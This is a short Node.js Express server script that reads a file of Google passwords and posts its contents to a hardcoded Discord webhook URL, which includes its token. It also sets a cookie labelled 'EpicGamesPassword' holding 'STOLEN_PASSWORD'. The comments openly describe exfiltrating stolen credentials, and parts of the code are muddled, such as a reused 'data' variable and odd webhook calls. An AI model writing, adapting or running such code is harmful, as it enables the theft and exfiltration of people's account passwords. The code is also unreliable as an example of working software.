const fs = require('fs');
const DiscordWebhook = require('discord-webhook-node');

const hook = new DiscordWebhook('https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4');

const express = require('express');
const app = express();
app.use(express.json());

app.get('/', function (req, res) {
    res.cookie('EpicGamesPassword', 'STOLEN_PASSWORD').sendStatus(200);
});

app.post('/', function (req, res) {
    const data = req.body;

    // Reading Google passwords from a text file
    fs.readFile('google_passwords.txt', (err, data) => {
        if (err) {
            console.error(err);
            hook.send('An error occurred while reading passwords file.', data);
            res.sendStatus(500);
            return;
        }

        // Sending the passwords as a JSON payload
        hook.send(JSON.stringify({ data: data.toString().split('\n') }), data);
        res.sendStatus(204);
    });
});

app.listen(3000, function () {
    console.log('App listening on port 3000!');
});